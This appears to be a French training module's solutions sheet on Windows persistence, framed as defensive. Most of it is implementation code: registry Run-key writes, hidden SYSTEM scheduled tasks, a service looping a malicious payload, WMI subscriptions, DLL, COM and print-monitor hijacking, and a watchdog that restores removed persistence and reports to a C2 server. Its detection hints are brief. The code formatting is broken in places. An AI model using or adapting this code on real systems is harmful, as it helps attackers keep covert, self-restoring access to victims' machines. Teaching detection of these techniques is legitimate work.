SOLUTIONS - MODULE 32 : WINDOWS PERSISTENCE

⚠️ AVERTISSEMENT : Architectures pour analyse défensive uniquement.

SOLUTION 1 : REGISTRY RUN KEYS COMPLETS

Tous locations :
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKCU\\...\\RunOnce
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\...\\RunOnce
HKCU\\...\\Explorer\\User Shell Folders (Common Startup)
HKCU\\...\\Explorer\\Shell Folders
HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit
HKLM\\...\\Winlogon\\Shell

Code :
HKEY hkey;
RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\...\\Run", 0, KEY_SET_VALUE, &hkey);
RegSetValueExA(hkey, "AppName", 0, REG_SZ, (BYTE*)path, len);
RegCloseKey(hkey);

Détection : Autoruns.exe, reg query commands


SOLUTION 2 : SCHEDULED TASKS COM API


```c
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
```

ITaskService* pService;
CoCreateInstance(&CLSID_TaskScheduler, ...);
pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

ITaskFolder* pRoot;
pService->GetFolder(_bstr_t(L"\\"), &pRoot);

ITaskDefinition* pTask;
pService->NewTask(0, &pTask);

ITriggerCollection* pTriggers;
pTask->get_Triggers(&pTriggers);

ITrigger* pTrigger;
pTriggers->Create(TASK_TRIGGER_LOGON, &pTrigger);

IExecAction* pAction;

```c
// Configure action, principal (SYSTEM), settings
```

pRoot->RegisterTaskDefinition(L"MyTask", pTask, ...);

Hidden : Settings->put_Hidden(VARIANT_TRUE)


SOLUTION 3 : WINDOWS SERVICE

SERVICE_TABLE_ENTRY ServiceTable[] = {
    {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
    {NULL, NULL}
};


```c
void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
```
    SERVICE_STATUS_HANDLE hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);


```c
    // Set status to running
```
    SERVICE_STATUS status = {0};
    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    status.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &status);


```c
    // Main loop
```
    while (running) {
        malicious_payload();
        Sleep(60000);
    }
}


```c
void WINAPI ServiceCtrlHandler(DWORD ctrl) {
```
    if (ctrl == SERVICE_CONTROL_STOP) {
        running = FALSE;

```c
        // Set status to stopped
    }
}
```


```c
int main() {
```
    StartServiceCtrlDispatcher(ServiceTable);
}

Installation :
sc create MyService binPath= C:\\malware.exe start= auto
sc start MyService


SOLUTION 4 : WMI EVENT SUBSCRIPTIONS

PowerShell creation :

```bash
$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{
```
    Name='MyFilter'
    EventNamespace='root\\cimv2'
    QueryLanguage='WQL'
    Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'
}


```bash
$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{
```
    Name='MyConsumer'
    CommandLineTemplate='C:\\malware.exe'
}

Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter=$filter
    Consumer=$consumer
}

Détection :
Get-WmiObject -Namespace root\\subscription -Class __EventFilter
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer
Autoruns (WMI tab)


SOLUTION 5 : DLL HIJACKING

1. Find vulnerable app :
   Process Monitor -> LoadImage filter -> NAME NOT FOUND

2. Create malicious DLL :
   BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
       if (fdwReason == DLL_PROCESS_ATTACH) {
           malicious_payload();
       }
   }

3. Place DLL :
   - Same directory as .exe (highest priority)
   - Current directory
   - System32 (if app runs elevated)

4. Proxy forwarding (optional) :

```bash
   #pragma comment(linker, "/export:OriginalFunc=original.OriginalFunc")
   // Load original DLL, forward calls
```

Search order :
1. EXE directory
2. System32
3. System
4. Windows
5. Current directory
6. PATH


SOLUTION 6 : COM HIJACKING

1. Find auto-launched CLSID :
   Process Monitor -> RegOpenKey -> CLSID
   Autoruns -> Everything tab

2. Hijack TreatAs or InprocServer32 :
   HKCU\\Software\\Classes\\CLSID\\{target-clsid}\\InprocServer32
   Set (Default) = C:\\malicious.dll

3. Malicious DLL exports DllGetClassObject :
   HRESULT WINAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
       malicious_payload();

```c
       // Load original COM object, return proxy
   }
```

Common targets :
- Explorer shell extensions
- Office COM objects
- AutoPlay handlers

Détection : Autoruns CLSID tab, reg queries


SOLUTION 7 : PRINT MONITORS

MONITOR_INFO_2 mi = {0};
mi.pName = L"MyMonitor";
mi.pEnvironment = L"Windows x64";
mi.pDLLName = L"C:\\malicious_monitor.dll";

AddMonitor(NULL, 2, (LPBYTE)&mi);

Monitor DLL :
BOOL WINAPI DllMain(...) {
    if (fdwReason == DLL_PROCESS_ATTACH) {

```c
        // Loaded by spoolsv.exe (SYSTEM)
```
        malicious_payload();
    }
}

Exports required :
- OpenPort
- StartDocPort
- WritePort
- ReadPort
- EndDocPort
- ClosePort

Détection :
reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors"
Get-PrintConfiguration


SOLUTION 8 : MULTI-METHOD REDUNDANCY

Watchdog thread :
DWORD WINAPI watchdog_thread(LPVOID param) {
    while (1) {

```c
        // Check Registry Run key
```
        if (!check_registry_persistence()) {
            restore_registry_persistence();
        }


```c
        // Check Scheduled Task
```
        if (!check_scheduled_task()) {
            restore_scheduled_task();
        }


```c
        // Check Service
```
        if (!check_service()) {
            restore_service();
        }

        Sleep(300000);  // 5 minutes
    }
}

Installation :
install_registry_persistence();
install_scheduled_task();
install_service();
install_wmi_subscription();
CreateThread(NULL, 0, watchdog_thread, NULL, 0, NULL);

Logging :
if (persistence_removed) {
    log_to_c2("Persistence method %d removed, restored", method_id);
}

Détection : Behavioral analysis, multiple autoruns, watchdog pattern

RÉFÉRENCES :
- MITRE ATT&CK Persistence (T1547-T1554)
- Autoruns documentation (Sysinternals)
- Windows Internals (Part 1, Chapter 5)
- Hexacorn blog (persistence techniques)
- JPCERT persistence methods

